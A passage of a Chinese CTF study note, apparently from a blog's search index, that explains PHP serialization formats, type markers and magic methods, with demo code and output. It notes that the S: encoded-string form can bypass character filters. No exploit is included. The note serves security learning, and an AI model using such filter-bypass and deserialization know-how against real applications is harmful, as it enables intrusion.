+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User implements Serializable &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    protected $email;</span><br><span class="line">    private $phoneNumber;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $email, $phoneNumber) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;email = $email;</span><br><span class="line">        $this-&gt;phoneNumber = $phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize() &#123;</span><br><span class="line">        return serialize([</span><br><span class="line">            &#x27;name&#x27; =&gt; $this-&gt;name,</span><br><span class="line">            &#x27;email&#x27; =&gt; $this-&gt;email,</span><br><span class="line">            &#x27;phoneNumber&#x27; =&gt; $this-&gt;phoneNumber,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($serialized) &#123;</span><br><span class="line">        $data = unserialize($serialized);</span><br><span class="line">        $this-&gt;name = $data[&#x27;name&#x27;];</span><br><span class="line">        $this-&gt;email = $data[&#x27;email&#x27;];</span><br><span class="line">        $this-&gt;phoneNumber = $data[&#x27;phoneNumber&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getPhoneNumber() &#123;</span><br><span class="line">        echo $this-&gt;phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getEmail() &#123;</span><br><span class="line">        return $this-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = new User(array(&quot;tan&quot;,&quot;ji&quot;), &#x27;admin@probius.xyz&#x27;, &#x27;19191145148&#x27;);</span><br><span class="line"></span><br><span class="line">$serializedData = serialize($user);</span><br><span class="line"></span><br><span class="line">echo $serializedData . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$deserializedUser = unserialize($serializedData);</span><br><span class="line"></span><br><span class="line">print_r($deserializedUser-&gt;name);</span><br><span class="line"></span><br><span class="line">echo $deserializedUser-&gt;getPhoneNumber() . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo $deserializedUser-&gt;getemail() . &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>在 User 类中，通过 <code>class User implements Serializable</code> 中的 <code>Serializable</code> 接口，我们可以定义 <code>serialize()</code> 和 <code>unserialize()</code> 两个方法，实现控制类实例在序列化和反序列化过程中的行为。</p>
+<p>这两个方法分别负责将类实例的属性序列化为字符串和从字符串中还原属性。</p>
+<p>当我们使用全局的 <code>serialize()</code> 和 <code>unserialize()</code> 函数时，这些方法会自动调用，从而让我们更好地控制序列化和反序列化过程。这也是该类型的类叫做 “CustomObject” 的原因。</p>
+<p>当我们运行上面的程序时，控制台输出如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:4:&quot;User&quot;:125:&#123;a:3:&#123;s:4:&quot;name&quot;;a:2:&#123;i:0;s:3:&quot;tan&quot;;i:1;s:2:&quot;ji&quot;;&#125;s:5:&quot;email&quot;;s:17:&quot;admin@probius.xyz&quot;;s:11:&quot;phoneNumber&quot;;s:11:&quot;19191145148&quot;;&#125;&#125; ---------------------------------------------------- echo $serializedData . &quot;\n&quot;;</span><br><span class="line">Array ------------------------------------------------ print_r($deserializedUser-&gt;name);</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; tan</span><br><span class="line">    [1] =&gt; ji</span><br><span class="line">)</span><br><span class="line">19191145148 ------------------------------------------ echo $deserializedUser-&gt;getPhoneNumber() . &quot;\n&quot;;</span><br><span class="line">admin@probius.xyz ------------------------------------ echo $deserializedUser-&gt;getemail() . &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>其格式大致为：<code>C::&quot;&quot;::&#123;&#125;</code></p>
+<p>为了方便理解，我们这样同样拆分一下：</p>
+<p><img src="https://hello-ctf.com/HC_Web/assets/202305121505237.png" alt="image-20230512150543122" loading="lazy"></p>
+<h3 id="其他标识¶"><a href="#其他标识¶" class="headerlink" title="其他标识¶"></a>其他标识<a href="https://hello-ctf.com/HC_Web/php_unser_base/#_5">¶</a></h3><p>除了上面常见的几个序列化字母标识外，还有其他标识 , 这里我们一起总结一下:</p>
+<ul>
+<li>a:array 数组</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo serialize(array(1,2)); --- a:2:&#123;i:0;i:1;i:1;i:2;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>b:boolean bool 值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo serialize(true);  ---- b:1;</span><br><span class="line">echo serialize(false); ---- b:0;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>C:custom object 自定义对象序列化</li>
+</ul>
+<p>使用 Serializable 接口定义了序列化和反序列化方法的类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class yourClassName implements Serializable</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>d:double 小数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo serialize(1.1); ---- d:1.1;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>i:integer 整数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo serialize(114); ---- i:114;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>o:commonObject 对象</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">似乎在php4的时候就弃用了</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>O:Object 对象</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class a&#123;&#125;</span><br><span class="line">echo serialize(new a());</span><br><span class="line">------ O:1:&quot;a&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>r:reference 对象引用 &amp;&amp; R:pointer reference 指针引用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $ClassA;</span><br><span class="line">    public $refer;</span><br><span class="line">    public $pointer;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;ClassA = new A();</span><br><span class="line">        $this-&gt;refer = $this-&gt;ClassA;</span><br><span class="line">        $this-&gt;pointer = &amp;$this-&gt;ClassA;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new B();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>控制台输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;B&quot;:3:</span><br><span class="line">&#123;</span><br><span class="line">    s:6:&quot;ClassA&quot;;O:1:&quot;A&quot;:0:&#123;&#125;</span><br><span class="line">    s:5:&quot;refer&quot;;r:2;</span><br><span class="line">    s:7:&quot;pointer&quot;;R:2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hello-ctf.com/HC_Web/assets/202305121732731.png" alt="image-20230512173231633" loading="lazy"></p>
+<p>此外，引用对象的属性值取决于声明顺序。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $ClassA;</span><br><span class="line">    public $ClassC;</span><br><span class="line">    public $pointer_1;</span><br><span class="line">    public $pointer_2;</span><br><span class="line"></span><br><span class="line">    public $refer;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;ClassA = new A();</span><br><span class="line">        $this-&gt;ClassC = new C();</span><br><span class="line">        $this-&gt;refer = $this-&gt;ClassA;</span><br><span class="line">        $this-&gt;pointer_1 = &amp;$this-&gt;ClassA;</span><br><span class="line">        $this-&gt;pointer_2 = &amp;$this-&gt;ClassC;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new B();</span><br><span class="line">echo serialize($a);</span><br><span class="line">// ----------------------- 当改变ClassA / C 的声明顺序的时候输出如下:</span><br><span class="line">// O:1:&quot;B&quot;:5:&#123;s:6:&quot;ClassC&quot;;O:1:&quot;C&quot;:0:&#123;&#125;s:6:&quot;ClassA&quot;;O:1:&quot;A&quot;:0:&#123;&#125;s:9:&quot;pointer_1&quot;;R:3;s:9:&quot;pointer_2&quot;;R:2;s:5:&quot;refer&quot;;r:3;&#125;</span><br><span class="line">// O:1:&quot;B&quot;:5:&#123;s:6:&quot;ClassA&quot;;O:1:&quot;A&quot;:0:&#123;&#125;s:6:&quot;ClassC&quot;;O:1:&quot;C&quot;:0:&#123;&#125;s:9:&quot;pointer_1&quot;;R:2;s:9:&quot;pointer_2&quot;;R:3;s:5:&quot;refer&quot;;r:2;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>s:string 字符串</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class a&#123;&#125;</span><br><span class="line">echo serialize(new a());</span><br><span class="line">------ O:1:&quot;a&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>S:encoded string</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S:1:&quot;\61&quot;; --- 可以将16进制编码成字符，可以进行绕过特定字符</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>N:null NULL 值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo serialize(NULL); --- N;</span><br></pre></td></tr></table></figure>
+
+<h3 id="魔术方法¶"><a href="#魔术方法¶" class="headerlink" title="魔术方法¶"></a>魔术方法<a href="https://hello-ctf.com/HC_Web/php_unser_base/#_6">¶</a></h3><p>在 PHP 的序列化中，魔术方法（Magic Methods）是一组特殊的方法，这些方法以双下划线（<code>__</code>）作为前缀，可以在特定的序列化阶段触发从而使开发者能够进一步的控制 序列化 &#x2F; 反序列化 的过程。</p>
+<p>你可以在 PHP 官方文档中查找到对应魔术方法的定义和使用方法：<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: 魔术方法 - Manual</a></p>
+<p>一般在题目中常见的几个方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() //------ 执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //------- 执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //---- 对象被销毁时触发</span><br><span class="line">__call() //-------- 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //-- 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //--------- 用于从不可访问的属性读取数据或者不存在这个键都会调用此法</span><br><span class="line">__set() //--------- 用于将数据写入不可访问的属性</span><br><span class="line">__isset() //------- 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //------- 在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //---- 把类当作字符串使用时触发</span><br><span class="line">__invoke() //------ 当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
+
+<p>一份比较全面的表格：</p>
+<table>
+<thead>
+<tr>
+<th align="left">magicMethods</th>
+<th align="left">attribute</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">__construct</td>
+<td align="left">当一个对象被创建时自动调用这个方法，可以用来初始化对象的属性。</td>
+</tr>
+<tr>
+<td align="left">__destruct</td>
+<td align="left">当一个对象被销毁时自动调用这个方法，可以用来释放对象占用的资源。</td>
+</tr>
+<tr>
+<td align="left">__call</td>
+<td align="left">在对象中调用一个不存在的方法时自动调用这个方法，可以用来实现动态方法调用。</td>
+</tr>
+<tr>
+<td align="left">__callStatic</td>
+<td align="left">在静态上下文中调用一个不存在的方法时自动调用这个方法，可以用来实现动态静态方法调用。</td>
+</tr>
+<tr>
+<td align="left">__get</td>
+<td align="left">当一个对象的属性被读取时自动调用这个方法，可以用来实现属性的访问控制。</td>
+</tr>
+<tr>
+<td align="left">__set</td>
+<td align="left">当一个对象的属性被设置时自动调用这个方法，可以用来实现属性的访问控制。</td>
+</tr>
+<tr>
+<td align="left">__isset</td>
+<td align="left">当使用 isset() 或 empty() 测试一个对象的属性时自动调用这个方法，可以用来实现属性的访问控制。</td>
+</tr>
+<tr>
+<td align="left">__unset</td>
+<td align="left">当使用 unset() 删除一个对象的属性时自动调用这个方法，可以用来实现属性的访问控制。</td>
+</tr>
+<tr>
+<td align="left">__toString</td>
+<td align="left">当一个对象被转换为字符串时自动调用这个方法，可以用来实现对象的字符串表示。</td>
+</tr>
+<tr>
+<td align="left">__invoke</td>
+<td align="left">当一个对象被作为函数调用时自动调用这个方法，可以用来实现对象的可调用性。</td>
+</tr>
+<tr>
+<td align="left">__set_state</td>
+<td align="left">当使用 var_export() 导出一个对象时自动调用这个方法，可以用来实现对象的序列化和反序列化。</td>
+</tr>
+<tr>
+<td align="left">__clone</td>
+<td align="left">当一个对象被克隆时自动调用这个方法，可以用来实现对象的克隆。</td>
+</tr>
+<tr>
+<td align="left">__debugInfo</td>
+<td align="left">当使用 var_dump() 或 print_r() 输出一个对象时自动调用这个方法，可以用来控制对象的调试信息输出。</td>
+</tr>
+<tr>
+<td align="left">__sleep</td>
+<td align="left">在对象被序列化之前自动调用这个方法，可以用来控制哪些属性被序列化。</td>
+</tr>
+<tr>
+<td align="left">__wakeup</td>
+<td align="left">在对象被反序列化之后自动调用这个方法，可以用来重新初始化对象的属性。</td>
+</tr>
+</tbody></table>
+<p>PHP 官方文档已经很详细了，这里不在赘述，不一定需要学会所有的函数，除开常见的，其他的在遇到的时候查阅即可。</p>
+]]></content>
+      <categories>
+        <category>Note</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
 </search>
